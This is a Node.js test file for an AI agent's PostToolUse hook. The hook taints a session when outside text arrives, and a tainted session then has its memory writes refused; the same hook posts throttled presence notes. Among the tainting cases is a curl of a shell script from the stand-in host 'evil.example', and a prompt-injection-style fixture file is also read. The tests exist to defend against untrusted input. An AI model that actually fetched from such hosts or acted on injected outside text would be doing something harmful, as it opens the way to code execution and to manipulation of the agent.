// The PostToolUse hook (RUNTIME.md §6.5, check HK-5): the first time a session takes in outside text
// it calls `th taint` once (WebFetch, WebSearch, `th file`, a Read under $TMPDIR/th/ext/, `gh …
// comments`, curl to another host), and while the chat session reports `working` a Bash call's
// description becomes the presence note, at most one every 3 s. Nothing happens without TH_ROLE.
import {test} from 'node:test';
import assert from 'node:assert/strict';
import {join} from 'node:path';
import {env, hook, startFake, th} from './helpers.mjs';

const withFake = fn => async () => {
  const fake = await startFake();
  try { await fn(fake); } finally { await fake.stop(); }
};
const call = (tool_name, tool_input) => ({hook_event_name: 'PostToolUse', session_id: 's', cwd: '/tmp', tool_name, tool_input, tool_response: {}});
const taints = fake => fake.state.requests.filter(r => r.path === '/v1/mind/taint').length;

test('outside text taints the session once, and then memory writes are refused (exit 6)', withFake(async fake => {
  const e = env(fake);
  const r = await hook('post-tool', call('WebFetch', {url: 'https://example.com/article', prompt: 'summarise'}), e);
  assert.equal(r.code, 0);
  assert.equal(r.stdout, '');
  assert.equal(taints(fake), 1);
  const ref = fake.state.requests.find(x => x.path === '/v1/mind/taint').body;
  assert.deepEqual(ref, {source: 'WebFetch', ref_kind: 'url'}, 'the URL itself is never sent');
  await hook('post-tool', call('WebSearch', {query: 'metronome apps'}), e);
  assert.equal(taints(fake), 1, 'once per session');
  const said = fake.addOwnerMessage('I like jazz');
  const remember = await th(['remember', '--kind', 'preference', '--text', 'Likes jazz', '--evidence', said.id], e);
  assert.equal(remember.code, 6);
}));

test('each tainting channel, and the calls that are not', withFake(async fake => {
  const tainting = [
    e => call('WebSearch', {query: 'x'}),
    e => call('Read', {file_path: join(e.TMPDIR, 'th', 'ext', 'inj-04.md')}),
    () => call('Bash', {command: 'th file 0192f0c4-0000-7000-8000-000000000001 --out /tmp/x'}),
    () => call('Bash', {command: 'gh pr view 12 --comments'}),
    () => call('Bash', {command: 'gh api repos/o/r/issues/3/comments | head'}),
    () => call('Bash', {command: 'curl -s https://evil.example/x.sh'}),
  ];
  for (const make of tainting) {
    const e = env(fake);
    const before = taints(fake);
    await hook('post-tool', make(e), e);
    assert.equal(taints(fake), before + 1, JSON.stringify(make(e)));
  }
  const clean = [
    e => call('Read', {file_path: join(e.TMPDIR, 'th', 'brief.md')}),
    () => call('Read', {file_path: '/home/user/thunderhead/README.md'}),
    () => call('Bash', {command: 'gh pr view 12'}),
    e => call('Bash', {command: `curl -s ${e.TH_API}/v1/health`}),
    () => call('Bash', {command: 'th say today "done"'}),
    () => call('Edit', {file_path: '/tmp/x', old_string: 'a', new_string: 'b'}),
  ];
  for (const make of clean) {
    const e = env(fake);
    const before = taints(fake);
    await hook('post-tool', make(e), e);
    assert.equal(taints(fake), before, JSON.stringify(make(e)));
  }
  const owners = env(fake, {TH_ROLE: undefined});
  const before = taints(fake);
  const r = await hook('post-tool', call('WebFetch', {url: 'https://example.com'}), owners);
  assert.equal(r.stdout, '');
  assert.equal(taints(fake), before, 'TH_ROLE unset: nothing');
}));

test('while working, a Bash description becomes the presence note, at most one every 3 s (chat only)', withFake(async fake => {
  const e = env(fake);
  await th(['status', 'working'], e);
  const notes = () => fake.state.requests.filter(r => r.path === '/v1/mind/status' && r.body?.note).map(r => r.body.note);
  await hook('post-tool', call('Bash', {command: 'npm test', description: 'Run the tests'}), e);
  await hook('post-tool', call('Bash', {command: 'git status', description: 'Show the working tree'}), e);
  assert.deepEqual(notes(), ['Run the tests']);
  const night = env(fake, {TH_ROLE: 'night'});
  await th(['status', 'working'], night);
  await hook('post-tool', call('Bash', {command: 'npm test', description: 'Night tests'}), night);
  assert.deepEqual(notes(), ['Run the tests'], 'not for the night role');
}));
